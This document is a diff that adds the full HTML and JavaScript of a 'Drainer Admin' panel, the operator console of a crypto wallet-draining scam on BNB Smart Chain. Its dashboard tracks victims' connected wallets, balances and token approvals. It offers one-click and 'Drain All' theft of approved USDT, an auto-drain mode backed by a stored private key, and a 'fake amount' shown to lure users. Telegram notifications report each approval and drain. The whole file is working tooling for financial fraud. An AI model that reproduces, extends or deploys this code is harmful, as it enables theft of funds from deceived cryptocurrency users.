@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Drainer Admin</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    :root{--bg:#0B0E11;--card:#14171C;--border:#1E2329;--text:#EAECEF;--muted:#848E9C;--blue:#0500FF;--green:#0ECB81;--red:#F6465D;--yellow:#F0B90B}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+    .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh}
+    .login-box{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:32px;width:100%;max-width:360px}
+    .login-box h1{font-size:22px;margin-bottom:8px}
+    .login-box p{color:var(--muted);font-size:13px;margin-bottom:24px}
+    input,select{width:100%;background:#0B0E11;border:1px solid var(--border);border-radius:10px;padding:12px 14px;color:var(--text);font-size:14px;outline:none}
+    input:focus{border-color:var(--blue)}
+    .btn{padding:12px 20px;border:none;border-radius:10px;font-weight:600;font-size:14px;cursor:pointer}
+    .btn-primary{background:var(--blue);color:#fff;width:100%}
+    .btn-green{background:var(--green);color:#0B0E11}
+    .btn-red{background:var(--red);color:#fff}
+    .btn-outline{background:transparent;border:1px solid var(--border);color:var(--text)}
+    .btn-sm{padding:6px 12px;font-size:12px}
+    #dashboard{display:none}
+    .topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;border-bottom:1px solid var(--border);background:var(--card);position:sticky;top:0;z-index:10}
+    .topbar h1{font-size:18px}
+    .topbar-actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+    .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:20px 24px}
+    .stat{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px}
+    .stat-label{font-size:11px;color:var(--muted);text-transform:uppercase}
+    .stat-value{font-size:24px;font-weight:700;margin-top:4px}
+    .stat-value.green{color:var(--green)}
+    .main-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px;padding:0 24px 24px}
+    .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px}
+    .card h2{font-size:15px;margin-bottom:16px}
+    .form-group{margin-bottom:14px}
+    .form-group label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px}
+    .users-table{width:100%;border-collapse:collapse;font-size:13px}
+    .users-table th{text-align:left;padding:10px 12px;color:var(--muted);font-weight:500;border-bottom:1px solid var(--border);font-size:11px;text-transform:uppercase}
+    .users-table td{padding:12px;border-bottom:1px solid var(--border)}
+    .badge{display:inline-block;padding:3px 8px;border-radius:6px;font-size:11px;font-weight:600}
+    .badge-connected{background:rgba(5,0,255,.15);color:#7b75ff}
+    .badge-approved{background:rgba(14,203,129,.15);color:var(--green)}
+    .badge-drained{background:rgba(246,70,93,.15);color:var(--red)}
+    .badge-ready{background:rgba(240,185,11,.15);color:var(--yellow)}
+    .msg{padding:10px 14px;border-radius:8px;margin-bottom:12px;font-size:13px}
+    .msg-ok{background:rgba(14,203,129,.12);color:var(--green)}
+    .msg-err{background:rgba(246,70,93,.12);color:var(--red)}
+    .mono{font-family:ui-monospace,monospace;font-size:12px}
+    .quick-info{font-size:13px;color:var(--muted);line-height:1.7}
+    .section-full{padding:0 24px 24px}
+    .toggle{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+    .toggle input{width:auto}
+    @media(max-width:900px){.stats{grid-template-columns:repeat(2,1fr)}.main-grid{grid-template-columns:1fr}}
+  </style>
+</head>
+<body>
+  <div class="login-wrap" id="loginScreen">
+    <div class="login-box">
+      <h1>Drainer Admin</h1>
+      <p>BNB Smart Chain / BEP20</p>
+      <div class="form-group">
+        <input type="password" id="passInput" placeholder="Admin password" onkeydown="if(event.key==='Enter')login()">
+      </div>
+      <button class="btn btn-primary" onclick="login()">Login</button>
+      <div id="loginMsg" style="margin-top:12px"></div>
+    </div>
+  </div>
+
+  <div id="dashboard">
+    <div class="topbar">
+      <h1>Drainer Admin</h1>
+      <div class="topbar-actions">
+        <button class="btn btn-outline btn-sm" onclick="loadUsers()">Refresh</button>
+        <button class="btn btn-green btn-sm" onclick="drainAll()">Drain All</button>
+        <button class="btn btn-outline btn-sm" onclick="logout()">Logout</button>
+      </div>
+    </div>
+    <div id="globalMsg" style="padding:12px 24px 0"></div>
+    <div class="stats">
+      <div class="stat"><div class="stat-label">Total Users</div><div class="stat-value" id="statTotal">0</div></div>
+      <div class="stat"><div class="stat-label">Approved</div><div class="stat-value" id="statApproved">0</div></div>
+      <div class="stat"><div class="stat-label">Drained</div><div class="stat-value" id="statDrained">0</div></div>
+      <div class="stat"><div class="stat-label">Total Drained USDT</div><div class="stat-value green" id="statAmount">0.00</div></div>
+    </div>
+    <div class="main-grid">
+      <div class="card">
+        <h2>Settings</h2>
+        <div class="form-group">
+          <label>Receiver Wallet Address (BEP20 - 0x...)</label>
+          <input type="text" id="cfgReceiver" placeholder="0x... your wallet">
+        </div>
+        <div class="form-group">
+          <label>Private Key (for Auto Drain)</label>
+          <input type="password" id="cfgPrivateKey" placeholder="64 hex chars, leave blank if manual">
+        </div>
+        <div class="toggle">
+          <input type="checkbox" id="cfgAutoDrain">
+          <label for="cfgAutoDrain" style="margin:0">Auto Drain ON (when balance + approved)</label>
+        </div>
+        <div class="form-group">
+          <label>Fake Amount Shown to Users</label>
+          <input type="text" id="cfgFakeAmount" value="5000000">
+        </div>
+        <div class="form-group">
+          <label>New Admin Password</label>
+          <input type="password" id="cfgNewPass" placeholder="Leave blank to keep">
+        </div>
+        <button class="btn btn-primary" onclick="saveSettings()">Save Settings</button>
+      </div>
+      <div class="card">
+        <h2>Telegram Bot</h2>
+        <div class="form-group">
+          <label>Bot Token</label>
+          <input type="text" id="cfgTgToken" placeholder="123456:ABC-DEF...">
+        </div>
+        <div class="form-group">
+          <label>Chat ID</label>
+          <input type="text" id="cfgTgChat" placeholder="-100... or your id">
+        </div>
+        <button class="btn btn-outline btn-sm" onclick="testTg()" style="margin-bottom:16px">Test Telegram</button>
+        <div class="quick-info">
+          1. @BotFather se bot banao, token lo<br>
+          2. Bot ko start karo, Chat ID lo (@userinfobot)<br>
+          3. Save Settings<br>
+          4. Approve / Deposit / Drain pe message aayega
+        </div>
+      </div>
+    </div>
+    <div class="section-full">
+      <div class="card">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <h2 style="margin:0">Connected Users</h2>
+          <span style="font-size:12px;color:var(--muted)" id="lastUpdate"></span>
+        </div>
+        <div style="overflow-x:auto">
+          <table class="users-table">
+            <thead>
+              <tr>
+                <th>Address</th>
+                <th>BNB</th>
+                <th>USDT</th>
+                <th>Allowance</th>
+                <th>Status</th>
+                <th>Connected</th>
+                <th>Actions</th>
+              </tr>
+            </thead>
+            <tbody id="usersBody">
+              <tr><td colspan="7" style="text-align:center;color:var(--muted)">No users yet</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script>
+    let adminPass = localStorage.getItem('adminPass') || '';
+    async function api(path, opts = {}) {
+      const headers = Object.assign({ 'Content-Type': 'application/json', 'x-admin-pass': adminPass }, opts.headers || {});
+      const res = await fetch(path, Object.assign({}, opts, { headers }));
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) throw data;
+      return data;
+    }
+    async function login() {
+      const pass = document.getElementById('passInput').value;
+      adminPass = pass;
+      try {
+        await api('/api/admin/users');
+        localStorage.setItem('adminPass', pass);
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        loadConfig();
+        loadUsers();
+        setInterval(loadUsers, 15000);
+      } catch (e) {
+        document.getElementById('loginMsg').innerHTML = '<div class="msg msg-err">Wrong password</div>';
+      }
+    }
+    function logout() {
+      localStorage.removeItem('adminPass');
+      location.reload();
+    }
+    async function loadConfig() {
+      try {
+        const cfg = await api('/api/admin/config');
+        document.getElementById('cfgReceiver').value = cfg.receiverAddress || '';
+        document.getElementById('cfgFakeAmount').value = cfg.fakeAmount || '5000000';
+        document.getElementById('cfgAutoDrain').checked = !!cfg.autoDrain;
+        document.getElementById('cfgTgChat').value = cfg.telegramChatId || '';
+      } catch (e) {}
+    }
+    async function saveSettings() {
+      const receiver = document.getElementById('cfgReceiver').value.trim();
+      if (receiver && !/^0x[a-fA-F0-9]{40}$/.test(receiver)) {
+        showMsg('Enter valid 0x address', 'err');
+        return;
+      }
+      const body = {
+        receiverAddress: receiver,
+        fakeAmount: document.getElementById('cfgFakeAmount').value,
+        autoDrain: document.getElementById('cfgAutoDrain').checked,
+        telegramChatId: document.getElementById('cfgTgChat').value.trim()
+      };
+      const pk = document.getElementById('cfgPrivateKey').value.trim();
+      if (pk) body.privateKey = pk;
+      const tg = document.getElementById('cfgTgToken').value.trim();
+      if (tg) body.telegramBotToken = tg;
+      const np = document.getElementById('cfgNewPass').value;
+      if (np) body.adminPassword = np;
+      try {
+        await api('/api/admin/config', { method: 'POST', body: JSON.stringify(body) });
+        showMsg('Settings saved', 'ok');
+        if (np) { adminPass = np; localStorage.setItem('adminPass', np); }
+      } catch (e) {
+        showMsg(e.error || 'Save failed', 'err');
+      }
+    }
+    async function testTg() {
+      try {
+        await api('/api/admin/test-telegram', { method: 'POST' });
+        showMsg('Test message sent', 'ok');
+      } catch (e) {
+        showMsg(e.error || 'Telegram failed - check token/chat id', 'err');
+      }
+    }
+    async function loadUsers() {
+      try {
+        const users = await api('/api/admin/users');
+        const tbody = document.getElementById('usersBody');
+        if (!users.length) {
+          tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--muted)">No users yet</td></tr>';
+        } else {
+          tbody.innerHTML = users.map(u => `
+            <tr>
+              <td class="mono" title="${u.address}">${short(u.address)}</td>
+              <td>${parseFloat(u.balanceBNB||0).toFixed(4)}</td>
+              <td>${parseFloat(u.balanceUSDT||0).toFixed(2)}</td>
+              <td>${u.allowance === 'unlimited' || parseFloat(u.allowance)>1e10 ? 'MAX' : (u.allowance||'0')}</td>
+              <td><span class="badge badge-${badgeClass(u)}">${u.status||'connected'}</span></td>
+              <td>${formatDate(u.connectedAt)}</td>
+              <td>
+                <button class="btn btn-outline btn-sm" onclick="refreshUser('${u.id}')">Refresh</button>
+                <button class="btn btn-green btn-sm" onclick="drainUser('${u.id}')" ${u.drained?'disabled':''}>Drain</button>
+                <button class="btn btn-red btn-sm" onclick="deleteUser('${u.id}')">X</button>
+              </td>
+            </tr>
+          `).join('');
+        }
+        document.getElementById('statTotal').textContent = users.length;
+        document.getElementById('statApproved').textContent = users.filter(u => u.approved && !u.drained).length;
+        document.getElementById('statDrained').textContent = users.filter(u => u.drained).length;
+        const total = users.reduce((s,u) => s + parseFloat(u.drainedAmount||0), 0);
+        document.getElementById('statAmount').textContent = total.toFixed(2);
+        document.getElementById('lastUpdate').textContent = 'Updated ' + new Date().toLocaleTimeString();
+      } catch (e) {}
+    }
+    function badgeClass(u) {
+      if (u.drained) return 'drained';
+      if (u.status === 'ready_to_drain') return 'ready';
+      if (u.approved) return 'approved';
+      return 'connected';
+    }
+    function short(a) {
+      if (!a || a.length < 12) return a || '-';
+      return a.slice(0,6) + '...' + a.slice(-4);
+    }
+    function formatDate(d) {
+      if (!d) return '-';
+      try { return new Date(d).toLocaleString(); } catch(e) { return d; }
+    }
+    async function refreshUser(id) {
+      showMsg('Refreshing...', 'ok');
+      await api('/api/admin/refresh/' + id, { method: 'POST' });
+      loadUsers();
+    }
+    async function drainUser(id) {
+      if (!confirm('Drain this user?')) return;
+      showMsg('Draining...', 'ok');
+      try {
+        const r = await api('/api/admin/drain/' + id, { method: 'POST' });
+        showMsg('Done: ' + (r.amount || '') + (r.txHash ? ' Tx: ' + r.txHash : ''), 'ok');
+        loadUsers();
+      } catch (e) {
+        showMsg(e.error || e.message || 'Failed', 'err');
+      }
+    }
+    async function drainAll() {
+      if (!confirm('Drain ALL approved?')) return;
+      showMsg('Processing...', 'ok');
+      try {
+        const r = await api('/api/admin/drain-all', { method: 'POST' });
+        showMsg('Done', 'ok');
+        loadUsers();
+      } catch (e) {
+        showMsg(e.error || 'Failed', 'err');
+      }
+    }
+    async function deleteUser(id) {
+      if (!confirm('Remove?')) return;
+      await api('/api/admin/user/' + id, { method: 'DELETE' });
+      loadUsers();
+    }
+    function showMsg(text, type) {
+      const el = document.getElementById('globalMsg');
+      el.innerHTML = '<div class="msg msg-' + type + '">' + text + '</div>';
+      setTimeout(() => el.innerHTML = '', 6000);
+    }
+    if (adminPass) {
+      document.getElementById('passInput').value = adminPass;
+      login();
+    }
+  </script>
+</body>
+      </html>
